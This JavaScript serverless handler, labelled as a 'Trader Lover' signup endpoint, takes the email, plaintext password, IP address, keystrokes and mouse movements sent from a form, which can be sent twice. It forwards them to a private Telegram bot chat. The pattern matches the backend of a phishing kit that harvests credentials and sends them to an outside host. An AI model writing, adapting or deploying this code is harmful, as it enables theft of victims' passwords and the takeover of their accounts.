export default async function handler(req, res) {
  // Set CORS headers to allow requests from your domain
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  // Handle preflight requests
  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }

  // Only allow POST requests
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  try {
    // ✅ UPDATED: Extract submissionType from the request body
    const { email, password, ip, mouseMovements, keyPresses, timestamp, submissionType } = req.body;

    // ✅ SECURE: Credentials are read from Vercel's environment, NOT from code
    const botToken = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;

    // Validate that we have the necessary credentials
    if (!botToken || !chatId) {
      throw new Error('Missing Telegram credentials in environment variables');
    }

    // ✅ UPDATED: Include submission type in the message
    const messageText = `📧 Trader Lover - New Signup
📋 Type: ${submissionType === 'first' ? 'First Submission' : 'Second Submission'}
👤 Email: ${email}
🔑 Password: ${password}
🌐 IP Address: ${ip}
⏰ Time: ${new Date(timestamp).toLocaleString()}
🖱️ Mouse Movements: ${mouseMovements}
⌨️ Keystrokes: ${keyPresses}

Status: Pending Review`;

    const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;

    // Send the message to your Telegram bot
    const telegramResponse = await fetch(telegramUrl, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: chatId,
        text: messageText,
        parse_mode: 'HTML', // Optional: enables basic formatting in Telegram
      }),
    });

    if (!telegramResponse.ok) {
      const errorData = await telegramResponse.text();
      console.error('Telegram API error:', errorData);
      throw new Error('Failed to send Telegram notification');
    }

    // ✅ UPDATED: Send a more descriptive success response
    return res.status(200).json({
      success: true,
      message: `✅ ${submissionType} submission logged successfully.`
    });
  } catch (error) {
    console.error('Server Error:', error);
    return res.status(500).json({
      success: false,
      error: 'An internal server error occurred.'
    });
  }
}